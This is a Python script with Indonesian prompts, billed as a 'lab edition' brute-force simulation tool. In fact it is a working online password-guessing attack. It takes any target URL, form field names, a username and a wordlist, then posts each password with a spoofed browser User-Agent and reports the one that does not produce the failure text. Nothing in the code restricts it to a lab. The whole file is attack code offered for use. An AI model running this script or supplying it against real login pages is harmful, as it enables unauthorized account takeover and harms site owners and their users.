import requests
import sys

banner = """
==================================================
  ____  ____  _____     _   _ _____ _____ 
 / ___||  _ \| ____|   | \ | | ____|_   _|
 \___ \| | | |  _|     |  \| |  _|   | |  
  ___) | |_| | |___ _  | |\  | |___  | |  
 |____/|____/|_____(_) |_| \_|_____| |_|  
                                          
 BRUTEFORCE SIMULATION TOOL | Lab Edition
 Author: sdev
==================================================
"""

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

def read_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as file:
            for line in file:
                yield line.strip()
    except FileNotFoundError:
        print(f"[!] File {path} tidak ditemukan!")
        sys.exit(1)

def brute_force():
    print(banner)
    
    target_url = input("[?] Masukkan URL Target: ").strip()
    user_field = input("[?] Masukkan Nama Field Username (contoh 'log' atau 'username'): ").strip()
    pass_field = input("[?] Masukkan Nama Field Password (contoh 'pwd' atau 'password'): ").strip()
    username = input("[?] Masukkan Username Target: ").strip()
    wordlist_path = input("[?] Masukkan Nama/Path File Wordlist: ").strip()
    fail_trigger = input("[?] Masukkan teks indikator GAGAL di web target: ").strip()
    
    print("\n[#] Memulai Simulasi Lab...")
    
    words = read_wordlist(wordlist_path)
    
    for password in words:
        if not password:
            continue
            
        payload = {
            user_field: username,
            pass_field: password
        }
        
        try:
            response = requests.post(target_url, data=payload, headers=headers, timeout=5)
            
            if fail_trigger not in response.text:
                print(f"\n[+] SUCCESS: Password Ketemu -> {password}")
                return
            else:
                print(f"[-] Gagal: {password}")
                
        except requests.exceptions.Timeout:
            print(f"\n[!] Timeout: Server lambat merespon.")
            return
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Error Koneksi: {e}")
            return
            
    print("\n[-] Selesai: Password tidak ditemukan di wordlist.")

if __name__ == "__main__":
    brute_force()
